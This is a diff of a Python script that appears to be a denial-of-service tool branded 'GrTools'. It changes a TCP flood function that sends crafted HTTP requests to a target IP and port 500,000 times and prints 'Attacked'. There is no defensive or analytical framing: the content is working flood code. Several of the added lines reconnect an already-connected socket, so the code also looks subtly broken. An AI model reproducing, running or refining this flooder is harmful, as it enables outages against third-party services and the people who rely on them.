@@ -25,7 +25,6 @@ method = input("╔══\n╚══════>Server@GrTools~~ Enter Methods 
 if method == "TCP":
                 
     def tcpfl():
-        global useragents, socks3
         get_host = "GET HTTP/1.1\r\nHost: " + ip + "\r\n"
         connection = "Connection: Keep-Alive\r\n" + "\r\n"
         content = "Content-Type: application/x-www-form-urlencoded\r\nX-Requested-With: XMLHttpRequest\r\n charset=utf-8\r\n"
@@ -37,10 +36,14 @@ if method == "TCP":
                 sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                 sock.connect((ip, port))
                 sock.send(grtools)
+                sock.connect((ip, port))
+                sock.send(grtools)
                 sock.sendall(str.encode(request))
                 for _ in range(500000):
                     sock.send(grtools)
                     sock.sendall(str.encode(request))
+                    sock.connect((ip, port))
+                    sock.send(grtools)
                 print("[!] Attacked ")
             except socket.error:
                 print("[!] Attacked Slow ")
